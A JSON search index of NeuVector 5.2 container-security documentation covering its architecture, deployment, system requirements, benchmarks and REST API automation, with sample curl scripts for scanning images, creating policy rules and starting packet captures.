{"searchDocs":[{"title":"Automating NeuVector","type":0,"sectionRef":"#","url":"/5.2/automation","content":"Automating NeuVector NeuVector can be integrated into the CI/CD workflow to provide automated scanning and deployment. We provide examples of using the REST API to automate NeuVector deployment.","keywords":"","version":"5.2"},{"title":"NeuVector Workflow","type":0,"sectionRef":"#","url":"/5.2/automation/ci_workflow","content":"","keywords":"","version":"5.2"},{"title":"NeuVector Integration into CI/CD Workflow​","type":1,"pageTitle":"NeuVector Workflow","url":"/5.2/automation/ci_workflow#neuvector-integration-into-cicd-workflow","content":" NeuVector supports the entire CI/CD process and can be easily integrated into the workflow to provide security throughout the development and deployment process.  Dev and Continuous Integration Workflow​  NeuVector can be integrated into the Dev and CI processes to automate vulnerability scanning. The use of the NeuVector Jenkins plug-in and Registry scanning functions enable image scanning during this phase.    In addition, NeuVector can be used during automated application testing to analyze network connections and container behavior to anticipate any issues in staging or production.  Continuous Deployment and Production Workflow​  NeuVector can conduct pre-deployment compliance testing and security auditing prior to production as well as in production.    The multi-vector security platform is able to combine network security, container inspections, and host security to protect containers at run-time. ","version":"5.2","tagName":"h3"},{"title":"Installation / Deployment","type":0,"sectionRef":"#","url":"/5.2/basics/installation","content":"Installation / Deployment Deploy the NeuVector containers using Kubernetes, OpenShift, Rancher, AWS EKS, Azure AKS, Google GKE, IBM IKS, docker run, or docker-compose.","keywords":"","version":"5.2"},{"title":"5.x Overview","type":0,"sectionRef":"#","url":"/5.2/basics/overview","content":"","keywords":"","version":"5.2"},{"title":"The Full Life-Cycle Container Security Platform​","type":1,"pageTitle":"5.x Overview","url":"/5.2/basics/overview#the-full-life-cycle-container-security-platform","content":" note These docs describe the 5.x (Open Source) version. The 5.x images are accessible from Docker Hub with the appropriate tag, e.g. neuvector/controller:(version). For 4.x versions see the 4.x Docs.  NeuVector provides a powerful end-to-end container security platform. This includes end-to-end vulnerability scanning and complete run-time protection for containers, pods and hosts, including:  CI/CD Vulnerability Management &amp; Admission Control. Scan images with a Jenkins plug-in, scan registries, and enforce admission control rules for deployments into production.Violation Protection. Discovers behavior and creates a whitelist based policy to detect violations of normal behavior.Threat Detection. Detects common application attacks such as DDoS and DNS attacks on containers.DLP and WAF Sensors. Inspect network traffic for Data Loss Prevention of sensitive data, and detect common OWASP Top10 WAF attacks.Run-time Vulnerability Scanning. Scans registries, images and running containers orchestration platforms and hosts for common (CVE) as well as application specific vulnerabilities.Compliance &amp; Auditing. Runs Docker Bench tests and Kubernetes CIS Benchmarks automatically.Endpoint/Host Security. Detects privilege escalations, monitors processes and file activity on hosts and within containers, and monitors container file systems for suspicious activity.Multi-cluster Management. Monitor and manage multiple Kubernetes clusters from a single console.  Other features of NeuVector include the ability to quarantine containers and to export logs through SYSLOG and webhooks, initiate packet capture for investigation, and integration with OpenShift RBACs, LDAP, Microsoft AD, and SSO with SAML. Note: Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.  ","version":"5.2","tagName":"h3"},{"title":"Security Containers​","type":1,"pageTitle":"5.x Overview","url":"/5.2/basics/overview#security-containers","content":" The NeuVector run-time container security solution contains four types of security containers: Controllers, Enforcers, Managers, and Scanners. A special container called the Allinone is also provided to combine the Controller, Enforcer, and Manager functions all in one container, primarily for docker native deployments.  NeuVector can be deployed on virtual machines or on bare metal systems with a single os.  Controller​  The Controller manages the NeuVector Enforcer container cluster. It also provides REST APIs for the management console. Although typical test deployments have one Controller, multiple Controllers in a high-availability configuration is recommended. 3 controllers is the default in the Kubernetes Production deployment sample yaml.  Enforcer​  The Enforcer is a lightweight container that enforces the security policies. One enforcer should be deployed on each node (host), e.g. as a Daemon set.  note For Docker native (non Kubernetes) deployments the Enforcer container and the Controller cannot be deployed on the same node (except in the All-in-One case below).  Manager​  The Manager is a stateless container that provides a web-UI (HTTPS only) console for users to manage the NeuVector security solution. More than one Manager container can be deployed as necessary.  All-in-One​  The All-in-One container includes a Controller, an Enforcer and a Manager in one package. It's useful for easy installation in single-node or small-scale deployments.  Scanner​  The Scanner is a container which performs the vulnerability and compliance scanning for images, containers and nodes. It is typically deployed as a replicaset and can be scaled up to as many parallel scanners as desired in order to increase the scanning performance. The Controller assigns scanning jobs to each available scanner in a round-robin fashion until all scans are completed. The scanner also contains the latest CVE database and is updated regularly by NeuVector.  Updater​  The Updater is a container which when run, updates the CVE database for NeuVector. NeuVector regularly publishes new scanner images to include the latest CVE for vulnerability scans. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up, forcing a pull of an updated scanner image.  Architecture​  Here is a general architecture overview of NeuVector. Not shown is the separate scanner container, which can also be run as a stand-alone pipeline scanner.  ","version":"5.2","tagName":"h3"},{"title":"Deployment Examples​","type":1,"pageTitle":"5.x Overview","url":"/5.2/basics/overview#deployment-examples","content":" For common deployment patterns and best practices see the Onboarding/Best Practices section.  All-in-One and Enforcers​  This deployment is ideal for single-node or small-scale environments, for example for evaluation, testing, and small deployments. An All-in-One container is deployed on one node, which can also be a node with running application containers. An Enforcer can be deployed on all other nodes, with one Enforcer required on each node you wish to protect with NeuVector. This is also useful for native Docker deployments where a controller and enforcer cannot run on the same host.  Controller, Manager and Enforcer Containers​  This is a more generic deployment use case which consists one or more Controllers, one Manager and a set of Enforcers. The Controller and Manager can be deployed on the same node or on different nodes than the Enforcer.  All-in-One Only​  You can deploy just the allinone container for registry scanning, using the Jenkins plug-in, or simple one node testing of NeuVector.  Controller Only​  It is possible to deploy a single Controller container and/or scanner to manage vulnerability scanning outside a cluster, for example for use with the Jenkins plug-in. Registry scanning can also be performed by the Controller using the REST API exclusively, but typically a Manager container is also desired in order to provide console based configuration and results viewing for registry scanning. ","version":"5.2","tagName":"h3"},{"title":"Deployment Preparation","type":0,"sectionRef":"#","url":"/5.2/basics/installation/native","content":"","keywords":"","version":"5.2"},{"title":"Understanding How to Deploy NeuVector​","type":1,"pageTitle":"Deployment Preparation","url":"/5.2/basics/installation/native#understanding-how-to-deploy-neuvector","content":" Deploy the NeuVector containers using Kubernetes, OpenShift, Rancher, Docker, or other platforms. Each type of NeuVector container has a unique purpose and may require special performance or node selection requirements for optimum operation.  The NeuVector open source images are hosted on Docker Hub at /neuvector/{image name}.  See the Onboarding/Best Practices section to download an on boarding guide.  Deploy using Kubernetes, OpenShift, Rancher, or other Kubernetes-based tools​  To deploy NeuVector using Kubernetes, OpenShift, Rancher or other orchestration tools, see the preparation steps and sample files in the section Deploying NeuVector. This deploys manager, controller, scanner, and enforcer containers. For simple testing using the NeuVector Allinone container, see the section Special Use Cases with Allinone.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Automated deployments are supported using Helm, Red Hat/Community Operators, the rest API, or a Kubernetes ConfigMap. See the section Deploy Using ConfigMap for more details on automating deployment.  Deploy using Docker Native​  Before you deploy NeuVector with docker run or compose, you MUST set the CLUSTER_JOIN_ADDR to the appropriate IP address. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the docker-compose files for both allinone and enforcer. For example:  - CLUSTER_JOIN_ADDR=192.168.33.10   For Swarm-Based deployments, also add the following environment variable:  - NV_PLATFORM_INFO=platform=Docker   See the section Deploying NeuVector -&gt; Docker Production Deployment for instructions and examples.  Backing Up Configuration Files​  By default NeuVector stores various config files in /var/neuvector/config/backup on the Controller or Allinone node.  This volume can be mapped to persistent storage to maintain configuration. Files in the folder may need to be deleted in order to start fresh.  Volume Mapping​  Make sure volumes are mapped properly. NeuVector requires these to operate (/var/neuvector is only required on controller/allinone). For example:  volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Also, you may need to ensure that other tools are not blocking access to the docker.sock interface.  Ports and Port Mapping​  Make sure the required ports are mapped properly and open on the host. The Manager or Allinone requires 8443 (if using the console). The Allinone and Controller requires 18300, 18301, 18400, 18401 and optionally 10443, 11443, 20443, 30443. The Enforcer requires 18301 and 18401.  Note: If deploying docker native (including SWARM) make sure there is not any host firewall blocking access to required ports such as firewalld. If enabled, the docker0 interface must be added as a trusted zone for the allinone/controller hosts.  Port Summary​  The following table lists communications from each NeuVector container. The Allinone container combines the Manager, Controller and Enforcer containers so requires the ports listed for those containers.    The following table summarizes the listening ports for each NeuVector container.    Additional Ports​  In version 5.1, a new listener port has been added on 8181 in the controller for local controller communication only.  tcp 0 0 :::8181 :::* LISTEN 8/opa  ","version":"5.2","tagName":"h3"},{"title":"System Requirements","type":0,"sectionRef":"#","url":"/5.2/basics/requirements","content":"System Requirements System Requirements​ Component\t# of Instances\tRecommended vCPU\tMinimum Memory\tNotesController\tmin. 1 3 for HA (odd # only)\t1\t1GB\tvCPU core may be shared Enforcer\t1 per node/VM\t1+\t1GB\tOne or more dedicated vCPU for higher network throughput in Protect mode Scanner\tmin. 1 2+ for HA/Performance\t1\t1GB\tCPU core may be shared for standard workloads. Dedicate 1 or more CPU for high volume (10k+) image scanning. Registry image scanning is performed by the scanner and managed by the controller and the image is pulled by the scanner and expanded in memory. The minimum memory recommendation assumes images to be scanned are not larger than .5GB. When scanning images larger than 1GB, scanner memory should be calculated by taking the largest image size and adding .5GB. Example - largest image size = 1.3GB, the scanner container memory should be 1.8GB Manager\tmin 1 2+ for HA\t1\t1GB\tvCPU may be shared For configuration backup/HA, a RWX PVC of 1Gi or more. See Backups and Persistent Data section for more details.Recommended browser: Chrome for better performance Supported Platforms​ Officially supported linux distributions, SUSE Linux, Ubuntu, CentOS/Red Hat (Including all RHEL version e.g. 6/7/8), Debian, Rancher OS, CoreOS, AWS 'Bottlerocket'(see Note below) and Photon.CoreOS is supported (November 2023) for CVE scanning through RHEL mapping table provided by RedHat. Once an official feed is published by RedHat for CoreOS it will be supported.Officially supported Kubernetes and Docker compliant container management systems. The following platforms are tested with every release of NeuVector: Kubernetes 1.19+, SUSE Rancher (RKE, RKE2, K3s etc), RedHat OpenShift 4.6+ (3.x to 4.12 supported prior to NeuVector 5.2.x), Google GKE, Amazon EKS, Microsoft Azure AKS, IBM IKS, native docker, docker swarm. The following Kubernetes and docker compliant platforms are supported and have been verified to work with NeuVector: VMware Photon and Tanzu, SUSE CaaS, Oracle OKE, Mirantis Kubernetes Engine, Nutanix Kubernetes Engine, docker UCP/DataCenter, docker Cloud.Docker run-time version: 1.9.0 and up; Docker API version: 1.21, CE and EE.Containerd and CRI-O run-times (requires changes to volume paths in sample yamls). See changes required for Containerd in the Kubernetes deployment section and CRI-O in the OpenShift deployment section.NeuVector is compatible with most commercially supported CNI's. Officially tested and supported are openshift ovs (subnet/multitenant), calico, flannel, cilium, antrea and public clouds (gke, aks, iks, eks).Console: Chrome or Firefox browser recommended. IE 11 not supported due to performance issues.Minikube is supported for simple initial evaluation but not for full proof of concept. See below for changes required for the Allinone yaml to run on Minikube. AWS Bottlerocket Note: Must change path of the containerd socket specific to Bottleneck. Please see Kubernetes deployment section for details. Not Supported​ GKE Autopilot.AWS ECS is no longer supported. (NOTE: No functionality has been actively removed for operating NeuVector on ECS deployments. However, testing on ECS is no longer being perfromed by SUSE. While protecting ECS workloads with Neuvector likely will operate as expected, issues will not be investigated.)Docker on MacDocker on WindowsARM architectire is not currently supported, but being worked on for future releases.Rkt (container linux) from CoreOSAppArmor on K3S / SLES environments. Certain configurations may conflict with NeuVector and cause scanner errors; AppArmor should be disabled when deploying NeuVector.IPv6 is not supportedVMWare Integrated Containers (VIC) except in nested modeCloudFoundryConsole: IE 11 not supported due to performance issues.Nested container host in a container tools used for simple testing. For example, deployment of a Kubernetes cluster using 'kind' https://kind.sigs.k8s.io/docs/user/configuration/. Note 1: PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock note NeuVector supports running on linux-based VMs on Mac/Windows using Vagrant, VirtualBox, VMware or other virtualized environments. Minikube​ Please make the following changes to the Allinone deployment yaml. apiVersion: apps/v1 &lt;&lt;-- required for k8s 1.19 kind: DaemonSet metadata: name: neuvector-allinone-pod namespace: neuvector spec: selector: &lt;-- Added matchLabels: &lt;-- Added app: neuvector-allinone-pod &lt;-- Added minReadySeconds: 60 ... nodeSelector: &lt;-- DELETE THIS LINE nvallinone: &quot;true&quot; &lt;-- DELETE THIS LINE apiVersion: apps/v1 &lt;&lt;-- required for k8s 1.19 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: &lt;-- Added matchLabels: &lt;-- Added app: neuvector-enforcer-pod &lt;-- Added Performance and Scaling​ As always, performance planning for NeuVector containers will depend on several factors, including: (Controller &amp; Scanner) Number and size of images in registry to be scanned (by Scanner) initially(Enforcer) Services mode (Discover, Monitor, Protect), where Protect mode runs as an inline firewall(Enforcer) Type of network connections for workloads in Protect mode In Monitor mode (network filtering similar to a mirror/tap), there is no performance impact and the Enforcer handles traffic at line speed, generating alerts as needed. In Protect mode (inline firewall), the Enforcer requires CPU and memory to filter connections with deep packet inspection and hold them to determine whether they should be blocked/dropped. Generally, with 1GB of memory and a shared CPU, the Enforcer should be able to handle most environments while in Protect mode. For throughput or latency sensitive environments, additional memory and/or a dedicated CPU core can be allocated to the NeuVector Enforcer container. For performance tuning of the Controller and Scanner for registry scanning, see System Requirements above. For additional advice on performance and sizing, see the Onboarding/Best Practices section. Throughput​ As the chart below shows, basic throughput benchmark tests showed a maximum throughput of 1.3 Gbps PER NODE on a small public cloud instance with 4 CPU cores. For example, a 10 node cluster would then be able to handle a maximum of 13 Gbps of throughput for the entire cluster for services in Protect mode. This throughput would be projected to scale up as dedicated a CPU is assigned to the Enforcer, or the CPU speed changes, and/or additional memory is allocated. Again, the scaling will be dependent on the type of network/application traffic of the workloads. Latency​ Latency is another performance metric which depends on the type of network connections. Similar to throughput, latency is not affected in Monitor mode, only for services in Protect (inline firewall) mode. Small packets or simple/fast services will generate a higher latency by NeuVector as a percentage, while larger packets or services requiring complex processing will show a lower percentage of added latency by the NeuVector enforcer. The table below shows the average latency of 2-10% benchmarked using the Redis benchmark tool. The Redis Benchmark uses fairly small packets, so the the latency with larger packets would expected to be lower. Test\tMonitor\tProtect\tLatencyPING_INLINE\t34,904\t31,603\t9.46% SET\t38,618\t36,157\t6.37% GET\t36,055\t35,184\t2.42% LPUSH\t39,853\t35,994\t9.68% RPUSH\t37,685\t36,010\t4.45% LPUSH (LRANGE Benchmark)\t37,399\t35,220\t5.83% LRANGE_100\t25,539\t23,906\t6.39% LRANGE_300\t13,082\t12,277\t6.15% The benchmark above shows average TPS of Protect mode versus Monitor mode, and the latency added for Protect mode for several tests in the benchmark. The main way to lower the actual latency (microseconds) in Protect mode is to run on a system with a faster CPU. You can find more details on this open source Redis benchmark tool at https://redis.io/topics/benchmarks.","keywords":"","version":"5.2"},{"title":"REST API and Automation","type":0,"sectionRef":"#","url":"/5.2/automation/automation","content":"","keywords":"","version":"5.2"},{"title":"NeuVector Automation​","type":1,"pageTitle":"REST API and Automation","url":"/5.2/automation/automation#neuvector-automation","content":" There are many automation features in NeuVector to support the entire CI/CD workflow, including:  Jenkins plug-in to automated scanning during buildRegistry scanning to automate repository monitoringAdmission Control policies to allow/deny unauthorized deploymentsCIS benchmarks automatically run on hostsHelm chart on github for automated deployment on KubernetesResponse rules to automate responses to security eventsREST API for building automation of any NeuVector function  REST API​  The NeuVector solution can be managed using the REST API. Below are common examples of automation using the REST API. The REST API yaml doc is best viewed in the Swagger 2.0 viewer. The REST API documentation is below in a yaml file which is best viewed in a reader such as swagger.io.  Latest update can be found here. Also in the NeuVector GitHub source code repo. The apis.yaml from the main truck can include unreleased features. It is recommended to download the appropriate released version source code and extract the apis.yaml from the controller/api folder.  important If you are making REST API calls with username/password, please be sure make a DELETE call against /v1/auth when done. There is a maximum of 32 concurrent sessions for each user. If this is exceeded, an authentication failure will occur.  NeuVector also support Response Rules to automate common responses to security events or vulnerabilities detected. Please see the section Security Policy -&gt; Response Rules for more details.  Expose REST API in Kubernetes​  To expose the REST API for access from outside of the Kubernetes cluster, enable port 10443.  apiVersion: v1 kind: Service metadata: name: neuvector-service-rest namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   note type: NodePort can also be used instead of LoadBalancer.  note If using type LoadBalancer, set the controllerIP in the examples below to the external IP or URL for the loadbalancer.  Authentication for REST API​  The REST API supports two types of authentication: username/password and token. Both can be configured in Settings -&gt; Users, API Keys &amp; Roles, and be associated with default or custom roles to limit access privileges. The examples below show username/password based authentication where a token is created first, then used in subsequent REST API calls. If using a token, it can be used directly in each REST API call. Note: username based connections have a limited number of concurrent sessions, so it is important to delete the username token as shown below when finished. Token based authentication does not have a limit, but expire according to the time limit selected when created.  For token-based authentication, see the following screen shots and example call. Be sure to copy the secret and token once created, as there is no way to retrieve this after the screen in closed.        Trigger Vulnerability Scanning from a script​  NeuVector can be triggered automatically to scan an image for vulnerabilities. This can be done by configuring a registry/repository to be monitored, using the NeuVector Jenkins plug-in, or using the REST API. Please see the section on Scanning &amp; Compliance for more detail.  The sample script below shows how to remotely pull the container, run it, and scan it. It can be triggered from a Jenkins task (remote shell) or any CI/CD tool. A JSON parser tool (jq) is also used.  Be sure to enter the controller IP address in the script and change the container image name to the one you wish to scan. Also, update the username/password fields.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;&quot; _registryUsername_=&quot;&quot; _registryPassword_=&quot;&quot; _repository_=&quot;alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_   note You may need to install jq sudo yum install jq   For Kubernetes based deployments you can set the Controller IP as follows:  _podNAME_=`kubectl get pod -n neuvector -o wide | grep &quot;allinone\\|controller&quot; | head -n 1 | awk '{print $1}'` _controllerIP_=`kubectl exec $_podNAME_ -n neuvector -- consul info | grep leader_addr | awk -F&quot;:| &quot; '{print $3}'`   note In a multiple controller deployment the requests must be sent to a single controller IP so multiple requests for status of long running image scans go to the controller performing the scan.  For scanning locally instead of in a registry:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;tag&quot;: &quot;3.4&quot;, &quot;repository&quot;: &quot;nvlab/alpine&quot;, &quot;scan_layers&quot;: true}}' &quot;https://$_controllerIP_:443/v1/scan/repository&quot;   Sample output:  { &quot;report&quot;: { &quot;image_id&quot;: &quot;c7fc7faf8c28d48044763609508ebeebd912ad6141a722386b89d044b62e4d45&quot;, &quot;registry&quot;: &quot;&quot;, &quot;repository&quot;: &quot;nvlab/alpine&quot;, &quot;tag&quot;: &quot;3.4&quot;, &quot;digest&quot;: &quot;sha256:2441496fb9f0d938e5f8b27aba5cc367b24078225ceed82a9a5e67f0d6738c80&quot;, &quot;base_os&quot;: &quot;alpine:3.4.6&quot;, &quot;cvedb_version&quot;: &quot;1.568&quot;, &quot;vulnerabilities&quot;: [ { &quot;name&quot;: &quot;CVE-2018-0732&quot;, &quot;score&quot;: 5, &quot;severity&quot;: &quot;Medium&quot;, &quot;vectors&quot;: &quot;AV:N/AC:L/Au:N/C:N/I:N/A:P&quot;, &quot;description&quot;: &quot;During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).&quot;, &quot;package_name&quot;: &quot;openssl&quot;, &quot;package_version&quot;: &quot;1.0.2n-r0&quot;, &quot;fixed_version&quot;: &quot;1.0.2o-r1&quot;, &quot;link&quot;: &quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0732&quot;, &quot;score_v3&quot;: 7.5, &quot;vectors_v3&quot;: &quot;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&quot; }, ... ], &quot;layers&quot;: [ { &quot;digest&quot;: &quot;c68318b6ae6a2234d575c4b6b33844e3e937cf608c988a0263345c1abc236c14&quot;, &quot;cmds&quot;: &quot;/bin/sh&quot;, &quot;vulnerabilities&quot;: [ { &quot;name&quot;: &quot;CVE-2018-0732&quot;, &quot;score&quot;: 5, &quot;severity&quot;: &quot;Medium&quot;, &quot;vectors&quot;: &quot;AV:N/AC:L/Au:N/C:N/I:N/A:P&quot;, &quot;description&quot;: &quot;During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).&quot;, &quot;package_name&quot;: &quot;openssl&quot;, &quot;package_version&quot;: &quot;1.0.2n-r0&quot;, &quot;fixed_version&quot;: &quot;1.0.2o-r1&quot;, &quot;link&quot;: &quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0732&quot;, &quot;score_v3&quot;: 7.5, &quot;vectors_v3&quot;: &quot;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&quot; }, ... ], &quot;size&quot;: 5060096 } ] } }   Create Policy Rules Automatically​  To create a new rule in the NeuVector policy controller, the groups for the FROM and TO fields must exist first. The following sample creates a new Group based on the container label nv-service-type=data, and another Group for label nv-service-type=website. A rule is then created to allow traffic from the wordpress container to the mysql container using only the mysql protocol.  Be sure to update the username and password for access to the controller.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mydb&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;data&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mywp&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;website&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -X &quot;PATCH&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;insert&quot;: {&quot;rules&quot;: [{&quot;comment&quot;: &quot;Custom WP Rule&quot;, &quot;from&quot;: &quot;mywp&quot;, &quot;applications&quot;: [&quot;MYSQL&quot;], &quot;ports&quot;: &quot;any&quot;, &quot;to&quot;: &quot;mydb&quot;, &quot;action&quot;: &quot;allow&quot;, &quot;id&quot;: 0}], &quot;after&quot;: 0}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/policy/rule&quot; curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;   If the Groups already exist in NeuVector then the new rule can be created, skipping the Group creation steps. This example also removes the authentication token at the end. Note that a Rule ID number can be specified and NeuVector executes rules in numerical order lowest to highest.  Export/Import Configuration File​  Here are samples to backup the NeuVector configuration file automatically. You can select whether to export all configuration settings (policy, users, Settings etc), or only the policy.  important These samples are provided as examples only and are not officially supported unless a specific enterprise support agreement has been put in place.  To export all configuration:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # exporting the configuration with all settings   To export policy only:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ --section policy # exporting the configuration with policy only   To import the file:  ./config.py import -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # importing the configuration   Sample python files Contains config.py, client.py, and multipart.py. Download sample files: ImportExport. Please put all three files in one folder to run above commands. You may need install some Python modules in order to run the script.  sudo pip install requests six   Setting or Changing User Password​  Use the rest API calls for User management.  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: c64125decb31e6d3125da45cba0f5025' https://127.0.0.1:10443/v1/user/admin -X PATCH -d '{&quot;config&quot;:{&quot;fullname&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;new_password&quot;:&quot;NEWPASS&quot;}}'   Starting Packet Capture on a Container​  When a container exhibits suspicious behavior, start a packet capture.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;sniffer&quot;:{&quot;file_number&quot;:1,&quot;filter&quot;:&quot;port 1381&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/sniffer?f_workload=`docker inspect neuvector.allinone | jq -r .[0].Id`&quot;   Don’t forget to stop the sniffer session after some time so it doesn’t run forever. Number of files to rotate has a maximum value of 50.  Check and Accept the EULA (new deployments)​  Get the authentication TOKEN as above. Also replace the controller IP address with your as appropriate.  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: $_TOKEN_' https://127.0.0.1:10443/v1/eula | jq . { &quot;eula&quot;: { &quot;accepted&quot;:false } }   Accept EULA  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: $_TOKEN_' -d '{&quot;eula&quot;:{&quot;accepted&quot;:true}}' https://127.0.0.1:10443/v1/eula   Then check the EULA again.  Configure Registry Scanning​  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.connect.redhat.com&quot;, &quot;username&quot;: &quot;username&quot;, &quot;password&quot;: &quot;password&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;repository&quot;: &quot;neuvector/enforcer&quot;}}' &quot;https://controller:port/v1/scan/repository&quot;   Enable Packet Capture on All Pods in a Namespace​  #!/bin/bash #set -x hash 